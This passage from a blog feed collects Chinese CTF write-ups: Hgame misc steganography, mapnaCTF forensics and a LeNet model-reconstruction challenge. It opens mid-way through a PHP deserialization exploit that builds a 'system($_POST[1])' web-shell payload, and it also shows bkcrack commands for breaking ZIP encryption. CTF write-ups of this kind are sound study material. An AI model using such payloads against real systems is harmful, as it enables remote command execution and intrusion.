class="line"><span class="variable">$w</span>-&gt;arg = <span class="variable">$h</span>;</span><br><span class="line"><span class="variable">$h</span>-&gt;func = <span class="variable">$g</span>;</span><br><span class="line"><span class="variable">$g</span>-&gt;shell=<span class="string">&quot;urldecode&quot;</span>;</span><br><span class="line"><span class="variable">$g</span>-&gt;cmd = <span class="string">&quot;system(\$_POST[1]);&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$w</span>);</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Writeup</category>
      </categories>
      <tags>
        <tag>香山杯</tag>
      </tags>
  </entry>
  <entry>
    <title>2024Hgame-Writeup-Misc</title>
    <url>/2024/02/28/2024Hgame-Writeup-Misc/</url>
    <content><![CDATA[<h1>2024Hgame-Writeup-Misc</h1>
<h2 id="前言">前言</h2>
<p>中途去做其他的了，只做了部分题，这边只给个misc的部分题解</p>
<h2 id="Misc">Misc</h2>
<h3 id="try-another-way-to-see">try_another_way_to_see</h3>
<p><strong>考点：倾斜图片生成</strong></p>
<p>对png图片进行一个宽高修改，就可以看出flag了</p>
<p><img src="https://s2.loli.net/2024/02/28/hN1WR8fpi4goSTI.png" alt="2024Hgame_1"></p>
<h3 id="希儿希儿希尔">希儿希儿希尔</h3>
<p><strong>考点：LSB隐写、希尔密码、图片修复</strong></p>
<p>依然是先修复</p>
<p><img src="https://s2.loli.net/2024/02/28/qWIpSDiP5zxrHwY.png" alt="2024Hgame_2"></p>
<p>分离出一个压缩包，得到一段密文</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CVOCRJGMKLDJGBQIUIVXHEYLPNWR</span><br></pre></td></tr></table></figure>
<p><img src="https://s2.loli.net/2024/02/28/k857GEHMD6iwLqK.png" alt="2024Hgame_3"></p>
<p>图片的LSB里藏着密钥</p>
<p>希尔密码解密即得flag</p>
<h3 id="来自星尘的问候">来自星尘的问候</h3>
<p><strong>考点：steghide弱密码、图片密码</strong></p>
<p>首先steghide的弱密码爆破，得到一个压缩包</p>
<p>剩余都在图片之中，这种题目就emmm</p>
<p>出一次被骂一次😀</p>
<p><img src="https://s2.loli.net/2024/02/28/CriyEwZSTegjtqv.png" alt="2024Hgame_4"></p>
<h3 id="simple-attack">simple_attack</h3>
<p><strong>考点：明文攻击</strong></p>
<p>这道题有一个坑点就是明文攻击会需要根据出题者使用的压缩软件不同，就是你出题使用的压缩软件，必须和做题对明文进行压缩的软件相同，不仅仅从压缩算法来看，具体原因未知</p>
<p>本题最终测试出来使用的是bandzip</p>
<p>先提取出key，然后使用的是修改压缩包原密码的方式进行提取的文件</p>
<p>当时实际做的时候直接提取photo文件失败，才采取的上述方式</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bkcrack.exe -C attachment.zip -c 103223779_p0.jpg -P 103223779_p0.zip -p 103223779_p0.jpg</span><br><span class="line">bkcrack.exe -C attachment.zip -k e423add9 375dcd1c 1bce583e -U flag.zip easy</span><br></pre></td></tr></table></figure>
<p><img src="https://s2.loli.net/2024/02/28/Ht291v8dMkpcRml.png" alt="2024Hgame_5"></p>
<p>最后在base64转图片即可</p>
<p><img src="https://s2.loli.net/2024/02/28/Rzqt3GYFhnrg7kC.png" alt="2024Hgame_6"></p>
<h3 id="ek1ng-want-girlfriend">ek1ng_want_girlfriend</h3>
<p><strong>考点：文件提取</strong></p>
<p>流量里直接提取图片，flag在右下角</p>
<p><img src="https://s2.loli.net/2024/02/28/lwY7irV4zLckM9I.png" alt="2024Hgame_7"></p>
<p>没有女朋友+1，呜呜呜呜~~~~~</p>
<h3 id="ezWord">ezWord</h3>
<p><strong>考点：word隐写，盲水印，spam message，rot8000</strong></p>
<p>docx的本质是一个压缩文件，因此打开该文件，发现存在以下文件</p>
<p><img src="https://s2.loli.net/2024/02/28/dvx8chnJrYi9NPX.png" alt="2024Hgame_8"></p>
<p>盲水印得到密钥，解开压缩包</p>
<p><img src="https://s2.loli.net/2024/02/28/BirjTEcKl23CMsn.png" alt="2024Hgame_9"></p>
<p>压缩包有一段文本，是一种解密</p>
<p><a href="https://www.spammimic.com/decode.cgi">spammimic - decoded</a></p>
<p><img src="https://s2.loli.net/2024/02/28/c8xTOYNUVejrZdn.png" alt="2024Hgame_10"></p>
<p>这里卡了一会儿，本来以为是某种编码格式中突出的，最后发现原来是rot8000<img src="https://s2.loli.net/2024/02/28/fwAH9Tg3P42vRbh.png" alt="2024Hgame_11"></p>
<h3 id="龙之舞">龙之舞</h3>
<p><strong>考点：频谱隐写，deepsound，二维码修复</strong></p>
<p>给了一段音频，然后打开查看在频谱图中发现了一段密钥</p>
<p><img src="https://s2.loli.net/2024/02/28/ArbpHdq9IWfj2LJ.png" alt="2024Hgame_12"></p>
<p>但是明显经过了翻转处理，读起来不太对劲</p>
<p>最后得到的密钥为</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">5H8w1nlWCX3hQLG</span><br></pre></td></tr></table></figure>
<p>然后deepsound解密，并且提取出文件，一个Gif</p>
<p>我们通过分帧处理发现部分图片上存在二维码，因此将其拼接起来</p>
<p>最终进行二维码的修复即得flag</p>
<p><img src="https://s2.loli.net/2024/02/28/tZ1GXaDH6chuMgY.png" alt="2024Hgame_13"></p>
<h3 id="与ai聊天">与ai聊天</h3>
<p><img src="https://s2.loli.net/2024/02/28/7T2krtCFqy6aDz5.png" alt="2024Hgame_14"></p>
<h3 id="简单的vmdk取证">简单的vmdk取证</h3>
<p>要求找到windows上的密码，格式为hgame{nthash_password}</p>
<p><img src="https://s2.loli.net/2024/02/28/15YEtdsAmWajUqy.png" alt="2024Hgame_15"></p>
<p><img src="https://s2.loli.net/2024/02/28/IvcN7jUBfbZXx5E.png" alt="2024Hgame_16"></p>
<h3 id="简单的取证-不过前十个有红包">简单的取证,不过前十个有红包</h3>
<p>取证大师直接提出来了，但是我原本以为这两题是分开的，没想到是一块儿的</p>
<p><img src="https://s2.loli.net/2024/02/28/BwMRS9z5GkEON3F.png" alt="2024Hgame_17"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">968fJD17UBzZG6e3yjF6</span><br></pre></td></tr></table></figure>
<p>挂载即得</p>
<p><img src="https://s2.loli.net/2024/02/28/tRS2iJWhKnuBrPT.png" alt="2024Hgame_18"></p>
]]></content>
      <categories>
        <category>Writeup</category>
      </categories>
      <tags>
        <tag>Hgame</tag>
      </tags>
  </entry>
  <entry>
    <title>2024mapnaCTF-Writeup-Forensics</title>
    <url>/2024/02/03/2024mapnaCTF-Writeup-Forensics/</url>
    <content><![CDATA[<h1>2024mapnaCTF-Writeup-Forensics</h1>
<h2 id="前言">前言</h2>
<p>这是一个国际赛的复现，Forensics方向</p>
<p>实际比赛中该方向只完成一题，剩余为赛后复现</p>
<h2 id="Forensics">Forensics</h2>
<h3 id="PLC-I-🤖">PLC I 🤖</h3>
<p>在查看流量后，我们可以从长度为63的包内发现存在Trailer字符，按照顺序连接起来就是flag</p>
<p><img src="https://s2.loli.net/2024/02/03/x3foknX8vEcJ5rz.png" alt=""></p>
<h3 id="Tampered">Tampered</h3>
<p>这题当时做的时候一直在看相关字符，考虑是否是有相关的加密方式或者字符集问题，走入死胡同（</p>
<p>实际该题只是利用了一个换行符的问题打开文本文件，我们可以看到很多格式的字符串</p>
<p>直接使用记事本无异常，这边选择使用010打开，并且选择十六进制视图</p>
<p><img src="https://s2.loli.net/2024/02/03/EQIwu9XYdMWiRPB.png" alt=""></p>
<p>观察后可以看到0D0D0A，两个回车符和一个换行符</p>
<p>唯一一个可以发现不同就是使用了0D0A0D，这个也就是被篡改过的</p>
<p><img src="https://s2.loli.net/2024/02/03/DGZAkFtS2bzLn1u.png" alt=""></p>
<h3 id="PLC-II-🤖">PLC II 🤖</h3>
<p><strong>考点：西门子S7通信协议</strong></p>
<p><a href="https://wiki.wireshark.org/S7comm">S7comm - Wireshark Wiki</a></p>
<p>该题的流量是西门子的S7通信协议，在该流量片段中主要留存着的是连接、读取和设置 PLC 的时间的操作。同时我们观察实例可以发现s7 communication的data字段储存着时间戳信息，在挨个查看时间戳后竟然发现仅有编号40的流量内时间戳显示为2023年，其余均为2014，因此可以猜测出flag即为Data: (Timestamp: Sep 21, 2023 19:59:29.949)，修改格式即可</p>
<p><img src="https://s2.loli.net/2024/02/03/pNsUXv6qTPFdK9B.png" alt=""></p>
<h3 id="XXG">XXG</h3>
<p><strong>考点：gimp文件修复</strong></p>
<p>完全陌生的一种文件修复</p>
<p><a href="https://ctftime.org/writeup/38541">CTFtime.org / Mapna CTF 2024 / XXG / Writeup</a></p>
<p>重点还是资料的查询和检索问题</p>
<h3 id="Mitrek">Mitrek</h3>
<p><strong>考点：流量结构辨析</strong></p>
<p><a href="https://ptr-yudai.hatenablog.com/entry/2024/01/23/174849#Mitrek-2-solves">MapnaCTF 2023 Writeup - CTFするぞ (hatenablog.com)</a></p>
<p>emmmm，不是很看的懂，是怎么从16进制看出这个结构的，暂时放着吧</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">typedef struct &#123;</span><br><span class="line">  u8 size;</span><br><span class="line">  u32 always_one;</span><br><span class="line">  u8 size_minus_2;</span><br><span class="line">  u8 seq_number;</span><br><span class="line">  u8 type;</span><br><span class="line">  u8 contents[0]; // size-7 bytes</span><br><span class="line">&#125; packet_t;</span><br></pre></td></tr></table></figure>
<h3 id="JigBoy">JigBoy</h3>
<p><strong>考点：jb2</strong></p>
<p>一种叫做jb2的图片格式修正，但是复现没能成功？</p>
<p>已知信息如下，另外两份wp</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://ctftime.org/task/27538</span><br></pre></td></tr></table></figure>
<p>(<a href="https://ics.uci.edu/~dan/class/267/papers/jbig2.pdf">https://ics.uci.edu/~dan/class/267/papers/jbig2.pdf</a>)</p>
<p>还是搞不明白，看文档太吃力了</p>
<h2 id="总结">总结</h2>
<p>这算是一次比较认真的参与国际赛，感觉挺有趣，少了点套娃的感觉（</p>
<p>文件结构的修复，之前只碰见过一些常规的，关于这种本次也是经验不足</p>
]]></content>
      <categories>
        <category>Writeup</category>
      </categories>
      <tags>
        <tag>mapnaCT</tag>
      </tags>
  </entry>
  <entry>
    <title>AI-CTF（2）LeNet</title>
    <url>/2023/11/18/AI-CTF%EF%BC%882%EF%BC%89LeNet/</url>
    <content><![CDATA[<h1>AI-CTF（2）LeNet</h1>
<p>本题来自2023香山杯，目前已上线i春秋平台</p>
<p><a href="https://www.ichunqiu.com/battalion?t=1&amp;r=70899">https://www.ichunqiu.com/battalion?t=1&amp;r=70899</a></p>
<p>赛事进行时解出来的仅有国科大师傅的一支队伍，后续有看过他们的题解，但是没看明白，所以一直没有复现，后来出题方给出了官方题解和思路介绍，才明白本题的意思。</p>
<p>另外，做题前先看一下LeNet的网络结构</p>
<p>这是一个经典的手写识别模型，首先看一下基本的结构图</p>
<p><img src="https://s2.loli.net/2023/11/18/vCRd6oXKi1EH2Nh.png" alt=""></p>
<ul>
<li>
<p>池化（ Padding ）是指在输入数据的边缘添加一定数量的像素，使得输出数据的尺寸能够与输入数据相匹配。也就是在矩阵的边界上填充一些值，以增加矩阵的大小，通常用 0 或者复制边界像素来进行填充。</p>
</li>
<li>
<p>步幅（Stride）是指卷积核在每一次卷积操作中滑动的距离。步长的大小可以影响输出数据的大小，也可以影响特征提取能力和计算复杂度。当步长增大时，输出数据的尺寸会减小，特征提取能力会变弱，但计算速度会加快。</p>
</li>
<li>
<p>通道数（Channel）也称为深度或特征图数量，是指卷积神经网络中每一层输出的特征图数量。通道数的大小直接影响了卷积神经网络的特征提取能力和计算复杂度。通过增加通道数，可以增强卷积神经网络的特征提取能力，但也会增加计算复杂度。</p>
</li>
</ul>
<p>LeNet的网络结构相对简单，主要由卷积层、池化层和全连接层组成。</p>
<ol>
<li>
<p><strong>卷积层（Convolutional Layers）:</strong></p>
<ul>
<li>第一层：卷积层，使用卷积操作提取特征，通常包含多个卷积核（filters）。</li>
<li>激活函数：通常在卷积层后使用sigmoid或tanh等激活函数。</li>
</ul>
</li>
<li>
<p><strong>池化层（Pooling Layers）:</strong></p>
<ul>
<li>第一层：池化层，通过最大池化或平均池化减小特征图的尺寸，降低计算复杂度。</li>
</ul>
</li>
<li>
<p><strong>卷积层（Convolutional Layers）:</strong></p>
<ul>
<li>第二层：再次使用卷积层，提取更高级的特征。</li>
</ul>
</li>
<li>
<p><strong>池化层（Pooling Layers）:</strong></p>
<ul>
<li>第二层：再次使用池化层，继续降低特征图的尺寸。</li>
</ul>
</li>
<li>
<p><strong>Flatten层：</strong></p>
<ul>
<li>将池化层的输出展平为一维向量，为了连接到全连接层做准备。</li>
</ul>
</li>
<li>
<p><strong>全连接层（Fully Connected Layers）:</strong></p>
<ul>
<li>第一层：通常包含几百个神经元，用于学习更抽象的特征。</li>
<li>激活函数：通常使用sigmoid或tanh等激活函数。</li>
</ul>
</li>
<li>
<p><strong>全连接层（Fully Connected Layers）:</strong></p>
<ul>
<li>第二层：输出层，神经元数量等于分类的类别数。</li>
<li>激活函数：通常使用softmax函数，用于多类别分类问题。</li>
</ul>
</li>
</ol>
<p>下载附件有三个文件，分别是flag.rar，label.json，<a href="http://MyLeNet.pt">MyLeNet.pt</a>。所以首先针对模型查看，尝试复原</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> torch</span><br><span class="line">pt = torch.load(<span class="string">&quot;./MyLeNet.pt&quot;</span>, map_location=<span class="string">&quot;cpu&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> pt:</span><br><span class="line">    <span class="built_in">print</span>(i,pt[i].shape)</span><br></pre></td></tr></table></figure>
<p>所获得的网络结构</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">conv1.weight torch.Size([6, 1, 5, 5])</span><br><span class="line">conv1.bias torch.Size([6])</span><br><span class="line">conv2.weight torch.Size([16, 6, 5, 5])</span><br><span class="line">conv2.bias torch.Size([16])</span><br><span class="line">fc1.weight torch.Size([120, 256])</span><br><span class="line">fc1.bias torch.Size([120])</span><br><span class="line">fc2.weight torch.Size([84, 120])</span><br><span class="line">fc2.bias torch.Size([84])</span><br><span class="line">fc3.weight torch.Size([62, 84])</span><br><span class="line">fc3.bias torch.Size([62])</span><br></pre></td></tr></table></figure>
<p>一个LeNet模型的网络结构</p>
<ol>
<li>
<p><code>conv1</code>: 一个卷积层，输入通道数为1（灰度图像），输出通道数为6，卷积核大小为5x5。</p>
<ul>
<li><code>conv1.weight</code> 的形状为 <code>[6, 1, 5, 5]</code>，表示有6个卷积核，每个卷积核的大小为5x5。</li>
<li><code>conv1.bias</code> 的形状为 <code>[6]</code>，表示每个卷积核有一个偏置项。</li>
</ul>
</li>
<li>
<p><code>conv2</code>: 第二个卷积层，输入通道数为6，输出通道数为16，卷积核大小为5x5。</p>
<ul>
<li><code>conv2.weight</code> 的形状为 <code>[16, 6, 5, 5]</code>，表示有16个卷积核，每个卷积核的大小为5x5。</li>
<li><code>conv2.bias</code> 的形状为 <code>[16]</code>，表示每个卷积核有一个偏置项。</li>
</ul>
</li>
<li>
<p><code>fc1</code>: 第一个全连接层，输入特征数为<code>16 * 5 * 5</code>（第二个卷积层输出的特征图展平成一维向量），输出特征数为120。</p>
<ul>
<li><code>fc1.weight</code> 的形状为 <code>[120, 16 * 5 * 5]</code>，表示连接到全连接层的权重矩阵。</li>
<li><code>fc1.bias</code> 的形状为 <code>[120]</code>，表示全连接层的偏置项。</li>
</ul>
</li>
<li>
<p><code>fc2</code>: 第二个全连接层，输入特征数为120，输出特征数为84。</p>
<ul>
<li><code>fc2.weight</code> 的形状为 <code>[84, 120]</code>，表示连接到全连接层的权重矩阵。</li>
<li><code>fc2.bias</code> 的形状为 <code>[84]</code>，表示全连接层的偏置项。</li>
</ul>
</li>
<li>
<p><code>fc3</code>: 第三个全连接层，输入特征数为84，输出特征数为62。</p>
<ul>
<li><code>fc3.weight</code> 的形状为 <code>[62, 84]</code>，表示连接到全连接层的权重矩阵。</li>
<li><code>fc3.bias</code> 的形状为 <code>[62]</code>，表示全连接层的偏置项。</li>
</ul>
</li>
</ol>
<p>目前已知的网络结构已经包含了卷积层，全连接层，但是可以发现这之间是缺少了损失函数的。</p>
<p>当然这里参考并且了解了一下官方思路和唯一解题队伍思路的区别。</p>
<p>从官方出题人思路来看需要考虑池化存在两种方式和激活函数</p>
<ol>
<li>
<p>暂且按照LeNet神经网络中的最大池化来设计，于是可以写出如下网络结构</p>
<ul>
<li>当采用最大池化时，激活和池化的顺序并不影响计算结果</li>
<li>卷积 -&gt; 激活 -&gt; 池化</li>
<li>卷积 -&gt; 池化 -&gt; 激活</li>
<li>最大池化</li>
<li>平均池化</li>
</ul>
</li>
<li>
<p>常见的激活函数有如下4+1种</p>
<ul>
<li>Sigmoid函数</li>
<li>Tanh/双曲正切函数</li>
<li>ReLU函数</li>
<li>Softmax函数(一般出现在一个网络的最后一层)</li>
<li>未使用激活函数</li>
</ul>
</li>
</ol>
<p>（PS：实际在LeNet网络中，通常使用Sigmoid或Tanh激活函数在全连接层中，而在卷积层中可能使用Sigmoid、Tanh、ReLU等）</p>
<p>而在实际解题队伍是通过查看pt的pkl文件去发现模型中使用了Sigmoid函数和ReLU函数，然后再每一个需要使用的链接处进行遍历，查看哪一个能实际输出所需要的。</p>
<p><img src="https://s2.loli.net/2023/11/18/JKsFoHWEc7OnwBk.png" alt=""></p>
<p>（PS：复现到这边的时候又卡壳了，官方给出的exp不完全，qwq）</p>
<p>其实就是文件还剩下的一个label.json，以此作为标签映射</p>
<p>这是通过官方的给出的题解修改得到的完整exp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> torch</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> torch.nn <span class="keyword">as</span> nn</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line">pt = torch.load(<span class="string">&quot;./MyLeNet.pt&quot;</span>, map_location=<span class="string">&#x27;cpu&#x27;</span>)</span><br><span class="line"><span class="comment"># 这里是完整复原的网络结构，基本符合了上面所告知的LeNet层</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyLeNet</span>(nn.Module):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, list_func</span>):</span><br><span class="line">        <span class="built_in">super</span>().__init__()</span><br><span class="line">        self.idx = list_func</span><br><span class="line">        self.func = [<span class="literal">None</span>, nn.Sigmoid(), nn.Tanh(), nn.ReLU(), nn.Softmax()]</span><br><span class="line">        self.conv1 = nn.Conv2d(in_channels=<span class="number">1</span>, out_channels=<span class="number">6</span>, kernel_size=<span class="number">5</span>, stride=<span class="number">1</span>)</span><br><span class="line">        self.maxpool1 = nn.MaxPool2d(kernel_size=<span class="number">2</span>, stride=<span class="number">2</span>)</span><br><span class="line">        self.conv2 = nn.Conv2d(in_channels=<span class="number">6</span>, out_channels=<span class="number">16</span>, kernel_size=<span class="number">5</span>, stride=<span class="number">1</span>)</span><br><span class="line">        self.maxpool2 = nn.MaxPool2d(kernel_size=<span class="number">2</span>, stride=<span class="number">2</span>)</span><br><span class="line">        self.fc1 = nn.Linear(<span class="number">16</span> * <span class="number">4</span> * <span class="number">4</span>, <span class="number">120</span>)</span><br><span class="line">        self.fc2 = nn.Linear(<span class="number">120</span>, <span class="number">84</span>)</span><br><span class="line">        self.fc3 = nn.Linear(<span class="number">84</span>, <span class="number">62</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">forward</span>(<span class="params">self, x</span>):</span><br><span class="line">        x = self.conv1(x)</span><br><span class="line">        <span class="keyword">if</span> self.idx[<span class="number">0</span>] &gt; <span class="number">0</span>:</span><br><span class="line">            x = self.func[self.idx[<span class="number">0</span>]](x)</span><br><span class="line">        x = self.maxpool1(x)</span><br><span class="line">        x = self.conv2(x)</span><br><span class="line">        <span class="keyword">if</span> self.idx[<span class="number">1</span>] &gt; <span class="number">0</span>:</span><br><span class="line">            x = self.func[self.idx[<span class="number">1</span>]](x)</span><br><span class="line">        x = self.maxpool2(x)</span><br><span class="line">        x = torch.flatten(x, start_dim=<span class="number">1</span>)</span><br><span class="line">        x = self.fc1(x)</span><br><span class="line">        <span class="keyword">if</span> self.idx[<span class="number">2</span>] &gt; <span class="number">0</span>:</span><br><span class="line">            x = self.func[self.idx[<span class="number">2</span>]](x)</span><br><span class="line">        x = self.fc2(x)</span><br><span class="line">        <span class="keyword">if</span> self.idx[<span class="number">3</span>] &gt; <span class="number">0</span>:</span><br><span class="line">            x = self.func[self.idx[<span class="number">3</span>]](x)</span><br><span class="line">        x = self.fc3(x)</span><br><span class="line">        <span class="keyword">return</span> x</span><br><span class="line"><span class="comment"># 从label.json加载标签映射</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;./label.json&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> json_file:</span><br><span class="line">    label_mapping = json.load(json_file)</span><br><span class="line"><span class="comment"># 反转字典，将整数编码映射回字母</span></span><br><span class="line">reverse_label_mapping = &#123;v: k <span class="keyword">for</span> k, v <span class="keyword">in</span> label_mapping.items()&#125;</span><br><span class="line"><span class="comment"># 获取所有标签</span></span><br><span class="line">chars = <span class="built_in">list</span>(reverse_label_mapping.values())</span><br><span class="line">arrange_list = [[ j, k, l, m] <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>) <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>) <span class="keyword">for</span> l <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>) <span class="keyword">for</span> m <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>)]</span><br><span class="line"><span class="comment"># 这一部分会输出所有生成的base64</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">for idxs in arrange_list[:500]:</span></span><br><span class="line"><span class="string">    model = MyLeNet(idxs)</span></span><br><span class="line"><span class="string">    model.load_state_dict(pt)</span></span><br><span class="line"><span class="string">    tmp = &quot;&quot;</span></span><br><span class="line"><span class="string">    for i in range(56):</span></span><br><span class="line"><span class="string">        npy_0 = np.load(&quot;./flag/&quot;+str(i)+&quot;.npy&quot;).reshape((1,1,28,28)) # 调整样本为输入形状</span></span><br><span class="line"><span class="string">        tmp += str(chars[int(model(torch.tensor(npy_0).to(&#x27;cpu&#x27;)).argmax())])</span></span><br><span class="line"><span class="string">        print(tmp[-1],end=&#x27;&#x27;)</span></span><br><span class="line"><span class="string">    print()</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment"># 改进后的实现查找开头为flag的字符串</span></span><br><span class="line"><span class="keyword">for</span> idxs <span class="keyword">in</span> arrange_list:</span><br><span class="line">    model = MyLeNet(idxs)</span><br><span class="line">    model.load_state_dict(pt)</span><br><span class="line">    tmp = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">56</span>):</span><br><span class="line">        npy_0 = np.load(<span class="string">&quot;./flag/&quot;</span>+<span class="built_in">str</span>(i)+<span class="string">&quot;.npy&quot;</span>).reshape((<span class="number">1</span>,<span class="number">1</span>,<span class="number">28</span>,<span class="number">28</span>))</span><br><span class="line">        tmp += chars[<span class="built_in">int</span>(model(torch.tensor(npy_0).to(<span class="string">&#x27;cpu&#x27;</span>)).argmax())]</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        flag = base64.b64decode(tmp).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">        <span class="comment"># 已知flag为开头，所以可以通过这个去进行相应的查找</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;flag&quot;</span> <span class="keyword">in</span> flag:</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="built_in">print</span>(idxs)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>
<p>官方给出的exp是将可能的方法存储于指定列表，然后去查找，所以再此另外补充一份，确定了网络结构的exp，因为通过官方wp，已经得出了相应的激活函数，所以就不浪费时间了</p>
<p>搓了另外一份简化版exp，当然了，是得知了激活函数的前提下啦</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> torch</span><br><span class="line"><span class="keyword">import</span> torch.nn <span class="keyword">as</span> nn</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line">pt = torch.load(<span class="string">&quot;./MyLeNet.pt&quot;</span>, map_location=<span class="string">&quot;cpu&quot;</span>)</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">LeNet</span>(nn.Module):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">super</span>(LeNet, self).__init__()</span><br><span class="line">        <span class="comment"># 定义卷积层和连接层</span></span><br><span class="line">        self.conv1 = nn.Conv2d(in_channels=<span class="number">1</span>, out_channels=<span class="number">6</span>, kernel_size=<span class="number">5</span>, stride=<span class="number">1</span>)</span><br><span class="line">        self.maxpool1 = nn.MaxPool2d(kernel_size=<span class="number">2</span>, stride=<span class="number">2</span>)</span><br><span class="line">        self.conv2 = nn.Conv2d(in_channels=<span class="number">6</span>, out_channels=<span class="number">16</span>, kernel_size=<span class="number">5</span>, stride=<span class="number">1</span>)</span><br><span class="line">        self.maxpool2 = nn.MaxPool2d(kernel_size=<span class="number">2</span>, stride=<span class="number">2</span>)</span><br><span class="line">        <span class="comment"># 定义全连接层</span></span><br><span class="line">        self.fc1 = nn.Linear(<span class="number">256</span>, <span class="number">120</span>)</span><br><span class="line">        self.fc2 = nn.Linear(<span class="number">120</span>, <span class="number">84</span>)</span><br><span class="line">        self.fc3 = nn.Linear(<span class="number">84</span>, <span class="number">62</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">forward</span>(<span class="params">self, x</span>):</span><br><span class="line">        x = self.conv1(x)</span><br><span class="line">        x = self.maxpool1(x)</span><br><span class="line">        x = nn.Sigmoid()(x)</span><br><span class="line">        x = self.conv2(x)</span><br><span class="line">        x = self.maxpool2(x)</span><br><span class="line">        x = nn.ReLU()(x)</span><br><span class="line">        x = torch.flatten(x, start_dim=<span class="number">1</span>)</span><br><span class="line">        x = self.fc1(x)</span><br><span class="line">        x = nn.Sigmoid()(x)</span><br><span class="line">        x = self.fc2(x)</span><br><span class="line">        x = nn.ReLU()(x)</span><br><span class="line">        x = self.fc3(x)</span><br><span class="line">        <span class="keyword">return</span> x</span><br><span class="line"><span class="comment"># 创建LeNet实例</span></span><br><span class="line">lenet_model = LeNet()</span><br><span class="line"><span class="comment"># 加载预训练的权重</span></span><br><span class="line">lenet_model.load_state_dict(pt)</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;./label.json&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> json_file:</span><br><span class="line">    label_mapping = json.load(json_file)</span><br><span class="line"><span class="comment"># 反转字典，将整数编码映射回字母</span></span><br><span class="line">reverse_label_mapping = &#123;v: k <span class="keyword">for</span> k, v <span class="keyword">in</span> label_mapping.items()&#125;</span><br><span class="line"><span class="comment"># 获取所有标签</span></span><br><span class="line">chars = <span class="built_in">list</span>(reverse_label_mapping.values())</span><br><span class="line"><span class="comment"># 读取从0到56的.npy文件</span></span><br><span class="line">predicted_chars = []  <span class="comment"># 用于保存所有的预测字符</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">56</span>):  <span class="comment"># 从0到56</span></span><br><span class="line">    npy_file_path = <span class="string">f&quot;./flag/<span class="subst">&#123;i&#125;</span>.npy&quot;</span></span><br><span class="line">    npy_data = np.load(npy_file_path).reshape((<span class="number">1</span>, <span class="number">1</span>, <span class="number">28</span>, <span class="number">28</span>))</span><br><span class="line">    torch_input = torch.tensor(npy_data).<span class="built_in">float</span>()  <span class="comment"># 转换为PyTorch张量</span></span><br><span class="line">    <span class="comment"># 使用LeNet模型进行推理</span></span><br><span class="line">    output = lenet_model(torch_input)</span><br><span class="line">    <span class="comment"># 获取预测结果的索引</span></span><br><span class="line">    predicted_index = torch.argmax(output, dim=<span class="number">1</span>).item()</span><br><span class="line">    <span class="comment"># 根据索引获取对应的字符</span></span><br><span class="line">    predicted_char = chars[predicted_index]</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Prediction for <span class="subst">&#123;npy_file_path&#125;</span>: <span class="subst">&#123;predicted_char&#125;</span>&quot;</span>)</span><br><span class="line">    predicted_chars.append(predicted_char)</span><br><span class="line"><span class="comment"># 将获取的字符串拼接起来</span></span><br><span class="line">result_string = <span class="string">&#x27;&#x27;</span>.join(predicted_chars)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Concatenated Result:&quot;</span>, result_string)</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>AI</category>
        <category>AI-CTF</category>
      </categories>
      <tags>
        <tag>香山杯</tag>
        <tag>LeNet</tag>
        <tag>AI</tag>
      </tags>
  </entry>
  <entry>
    <title>2024西湖论剑-Writeup</title>
